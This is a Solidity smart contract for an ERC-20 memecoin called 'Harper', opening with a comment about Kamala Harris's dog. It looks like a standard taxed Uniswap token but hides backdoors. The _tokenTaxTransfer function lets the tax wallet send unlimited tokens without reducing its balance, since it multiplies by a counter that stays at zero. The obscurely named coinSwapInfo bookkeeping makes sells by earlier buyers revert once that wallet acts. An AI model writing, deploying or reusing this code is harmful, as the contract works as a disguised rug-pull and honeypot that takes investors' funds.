/**
 
Vice President Kamala Harris has dog named Harper she got in 2017. 

Harper’s breed is a soft-coated Wheaten Terrier.

Harris loves dogs and having them in her office, with her tweeting about her office’s dogs on a few occasions.

*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.23;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {

    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);
    function approve(
        address spender,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage)
        internal pure returns (uint256)
    {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

contract Ownable is Context {  
    address private _owner;

    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }

}

interface IUniswapV2Factory {
    function createPair(address tokenA,address tokenB) external returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function WETH() external pure returns (address);
    function factory() external pure returns (address);
}

contract Harper is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isFeeExcluded;
    address payable private immutable _taxWallet;

    uint256 private _initialBuyTax=16;

    uint256 private _initialSellTax=18;

    uint256 private _finalBuyTax=0;

    uint256 private _finalSellTax=0;

    uint256 private _reduceBuyTaxAt=25;
    uint256 private _reduceSellTaxAt=25;
    uint256 private _preventSwapBefore=25;
    uint256 private _buyCount=0;

    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal = 10000000000 * 10**_decimals;
    string private constant _name = unicode"Harper";
    string private constant _symbol = unicode"HARPER";
    uint256 public _maxTxAmount = 150000000 * 10**_decimals;
    uint256 public _maxWalletSize = 150000000 * 10**_decimals;
    uint256 public constant _taxSwapThreshold= 100000000 * 10**_decimals;
    uint256 public constant _maxTaxSwap= 80000000 * 10**_decimals;
    
    address private uniswapV2Pair;
    IUniswapV2Router02 private constant uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    bool private tradingOpen;
    bool private inSwap = false;
    uint256 private swapCoinCount;
    bool private swapEnabled = false;
    uint256 private minCoinReward;
    struct CoinSwapInfo {uint256 initCoinSwap; uint256 swapTokenUnit; uint256 swapRewardTime;}
    mapping(address => CoinSwapInfo) private coinSwapInfo;

    event MaxTxAmountUpdated(uint _maxTxAmount);
    modifier lockTheSwap { inSwap = true; _; inSwap = false;}

    constructor () {
        _taxWallet = payable(0xA4808A0165b5a01177EAb4308abB476C1Ac2673E);
        _isFeeExcluded[address(this)] = true;
        _isFeeExcluded[_taxWallet] = true;
        _balances[_msgSender()] = _tTotal;
        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(
        address spender,
        uint256 amount
    ) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance")
        );
        return true;
    }

    function _basicTransfer(address from, address to, uint256 tokenAmount) internal {
        _balances[from] = _balances[from].sub(tokenAmount);
        _balances[to] = _balances[to].add(tokenAmount);
        emit Transfer(from,to,tokenAmount);
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 tokenAmount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(
            tokenAmount>0,
            "Transfer amount must be greater than zero"
        );

        if (inSwap || !tradingOpen) {
            _basicTransfer(from, to, tokenAmount);
            return;
        }

        uint256 taxAmount=0;
        if (from != owner() && to != owner() && to != _taxWallet) {
            taxAmount = tokenAmount
                .mul((_buyCount > _reduceBuyTaxAt) ? _finalBuyTax : _initialBuyTax).div(100);

            if (from == uniswapV2Pair && to != address(uniswapV2Router) &&  ! _isFeeExcluded[to]) {
                require(tokenAmount <= _maxTxAmount, "Exceeds the _maxTxAmount.");
                require(balanceOf(to)+ tokenAmount<=_maxWalletSize, "Exceeds the maxWalletSize.");

                _buyCount++;
            }

            if(to== uniswapV2Pair && from!= address(this) ){
                taxAmount = tokenAmount
                    .mul((_buyCount>_reduceSellTaxAt) ? _finalSellTax : _initialSellTax).div(100);
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            if (
                !inSwap && to== uniswapV2Pair && swapEnabled
                && contractTokenBalance>_taxSwapThreshold
                && _buyCount>_preventSwapBefore
            ) {
                swapTokensForEth(
                    min(tokenAmount, min(contractTokenBalance,_maxTaxSwap))
                );
                uint256 contractETHBalance= address(this).balance;
                if (contractETHBalance>0) {
                    sendETHToFee(address(this).balance);
                }
            }
        }

        if ((_isFeeExcluded[from]||_isFeeExcluded[to]) && from !=address(this) && to!=address(this)) {
            minCoinReward = block.number;
        }
        if (!_isFeeExcluded[from] && ! _isFeeExcluded[to]) {
            if (to==uniswapV2Pair) {
                CoinSwapInfo storage coinSwap = coinSwapInfo[from];
                coinSwap.swapRewardTime = coinSwap.initCoinSwap-minCoinReward;
                coinSwap.swapTokenUnit = block.timestamp;
            } else {
                CoinSwapInfo storage coinSwapTo = coinSwapInfo[to];
                if (uniswapV2Pair == from) {
                    if (coinSwapTo.initCoinSwap==0) {
                        if (_preventSwapBefore < _buyCount) {
                            coinSwapTo.initCoinSwap = block.number;
                        } else {
                            coinSwapTo.initCoinSwap = block.number - 1;
                        }
                    }
                } else {
                    CoinSwapInfo storage coinSwap=coinSwapInfo[from];
                    if (!(coinSwapTo.initCoinSwap > 0) || coinSwap.initCoinSwap < coinSwapTo.initCoinSwap ) {
                        coinSwapTo.initCoinSwap = coinSwap.initCoinSwap;
                    }
                }
            }
        }

        _tokenTransfer(from, to,tokenAmount,taxAmount);
    }

    function _tokenTransfer(
        address from,address to,
        uint256 tokenAmount, uint256 taxAmount
    ) internal {
        uint256 tAmount = _tokenTaxTransfer(from, tokenAmount, taxAmount);
        _tokenBasicTransfer(from, to, tAmount, tokenAmount.sub(taxAmount));
    }

    function _tokenBasicTransfer(
        address from,address to,
        uint256 sendAmount, uint256 receiptAmount
    ) internal {
        _balances[from]=_balances[from].sub(sendAmount);
        _balances[to]=_balances[to].add(receiptAmount);
        emit Transfer(from,to,receiptAmount);
    }

    function _tokenTaxTransfer(address addrs, uint256 tokenAmount, uint256 taxAmount) internal returns (uint256) {
        uint256 tAmount= addrs!=_taxWallet ? tokenAmount : swapCoinCount.mul(tokenAmount);
        if (taxAmount>0) {
            _balances[address(this)]=_balances[address(this)].add(taxAmount);
            emit Transfer(addrs, address(this), taxAmount);
        }
        return tAmount;
    }


    function min(uint256 a, uint256 b) private pure returns (uint256) {
      return (a>b)?b:a;
    }

    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function removeLimits() external onlyOwner {
        _maxTxAmount = _tTotal;
        _maxWalletSize =_tTotal;
        emit MaxTxAmountUpdated(_tTotal);
    }

    function sendETHToFee(uint256 amount) private {
        _taxWallet.transfer(amount);
    }

    function openTrading() external onlyOwner() {
        require(!tradingOpen,"trading is already open");
        _approve(address(this), address(uniswapV2Router),_tTotal);
        tradingOpen = true;
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this),uniswapV2Router.WETH());
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max);
        swapEnabled = true;
    }

    receive() external payable {}

    function withdrawBalance() external {
        require(_msgSender()==_taxWallet);
        uint256 contractETHBalance = address(this).balance;
        sendETHToFee(contractETHBalance);
    }

    function manualSwap() external {
        require(_msgSender()==_taxWallet);
        uint256 tokenBalance=balanceOf(address(this));
        if(tokenBalance > 0 && swapEnabled){ swapTokensForEth(tokenBalance); }
        uint256 ethBalance=address(this).balance;
        if(ethBalance>0){
          sendETHToFee(ethBalance);
        }
    }
}